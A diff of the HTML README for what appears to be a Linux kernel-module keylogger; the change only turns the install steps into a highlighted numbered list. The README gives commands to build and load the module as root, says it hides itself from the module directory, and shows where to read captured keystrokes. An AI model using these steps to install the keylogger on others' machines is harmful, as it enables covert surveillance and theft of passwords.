@@ -11,10 +11,12 @@
 <li> remove the module from /sys/modules directory </li>
 <h2>how to use</h2>
 <p><b>for using the module u need to be super user</b></p>
-<p>clone the repo, using git clone comannd</p>
-<p>cd keylogger</p>
-<p>make</p>
-<p>sudo insmod kelogger.ko</p>
+<ol>
+<li><mark>clone the repo, using git clone comannd</mark></li>
+<li><mark>cd keylogger</mark></li>
+<li><mark>make</mark></li>
+<li><mark>sudo insmod kelogger.ko</mark></li>
+</ol>
 <h2>how to see the keyloging</h2>
 <p>cd /sys/kernel/debug/keylogger</p>
 <p>cat keyloging</p>
